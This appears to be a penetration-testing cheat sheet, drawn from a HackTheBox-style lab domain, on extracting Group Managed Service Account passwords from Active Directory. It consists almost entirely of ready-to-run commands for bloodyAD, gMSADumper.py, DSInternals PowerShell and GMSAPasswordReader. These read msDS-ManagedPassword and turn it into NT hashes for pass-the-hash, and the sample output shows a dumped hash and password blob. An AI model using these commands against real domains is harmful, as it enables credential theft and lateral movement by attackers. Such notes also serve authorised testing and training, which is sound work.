# Group Managed Service Accounts


## Detection
 * Bloodhound Data
 ```bash
 cat <Users.json> | jq '.data[].Properties | select(.samaccountname) | "\(.pwdlastset):\(.samaccountname)"' -r|sort -n
 ```
 Example:
 ```bash
 loot cat 20241130134537_users.json | jq '.data[].Properties | select(.samaccountname) | "\(.pwdlastset):\(.samaccountname)"' -r|sort -n
 1717583255:krbtgt
 1717584108:gMSA01$
 1717594268:G.Viola
 1717594268:L.Bianchi
 1717594268:M.Rossi
 1717594268:R.Verdi
 1717621693:C.Neri
 1717681527:svc_ark
 1717681527:svc_ldap
 1717757654:C.Neri_adm
 1717846494:Administrator
 1730896036:P.Rosa
 1731507413:Guest
 1732621230:L.Bianchi_adm
 1733002326:svc_sql
 ```
## Exploitation from Linux
### BloodyAD
 * Getting the hash:
 ```bash
 bloodyAD --host dc01.vintage.htb -u 'fs01$' -p 'fs01' -d vintage.htb -k get object 'gmsa01$' --attr msDS-ManagedPassword
 ```
 * Example
 ```bash
 bloodyAD --host dc01.vintage.htb -u 'fs01$' -p 'fs01' -d vintage.htb -k get object 'gmsa01$' --attr msDS-ManagedPassword 
 distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
 msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
 msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==
```
### [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper)
> gMSADumper.py requires LDAPS, which normally won't be available through linux
 ```bash
 # With Username and password
 python3 gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
 
 # With Kerberos
 python3 gMSADumper.py -k -d 'vintage.htb' -l 'dc01.vintage.htb'
 ```
## Exploitation from Windows
### AD and DSInternals
 ```ps1
 # Save the blob to a variable
 $gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
 $mp = $gmsa.'msDS-ManagedPassword'

 # Decode the data structure using the DSInternals module
 ConvertFrom-ADManagedPasswordBlob $mp
 # Build a NT-Hash for PTH
 (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
 # Alterantive: build a Credential-Object with the Plain Password
 $cred = new-object system.management.automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```
### [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
 ```ps1
 .\GMSAPasswordReader.exe --AccountName 'Target_Account'
 ```

